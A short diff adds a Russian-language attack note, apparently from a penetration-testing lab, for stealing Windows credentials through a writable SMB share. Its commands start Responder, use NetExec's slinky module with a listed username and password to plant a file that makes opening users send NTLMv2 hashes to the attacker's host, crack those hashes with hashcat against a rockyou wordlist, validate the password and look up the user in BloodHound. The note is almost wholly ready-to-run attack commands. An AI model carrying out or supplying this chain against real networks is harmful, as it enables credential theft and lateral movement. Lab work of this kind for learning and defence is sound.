@@ -1,0 +1,11 @@
+лучше всего осуществлять, когда есть права на хаписи в шаре
+1) поднимаем Responder 
+sudo responder -I tun0
+2)внедряем путь в <название шары>
+nxc smb domain.local -u 'h.user' -p 'explorerfeaturespassword1' -M slinky -o SERVER=ip_kali SHARES=<название шары> NAME=<название файла>
+на Responder видим, что перехватили NTLMv2 hash (пользователь открыл файл HackSmarter)
+копируем хэш вместе с hostname в файл hash.txt
+перебираем пароль
+hashcat granon-hash.txt /usr/share/wordlist/rockyou2024.txt
+валадируем пароль с помощью nxc smb -u 'user' -p "полученный пароль" --shares
+смотрим пользователя в bloodhound 
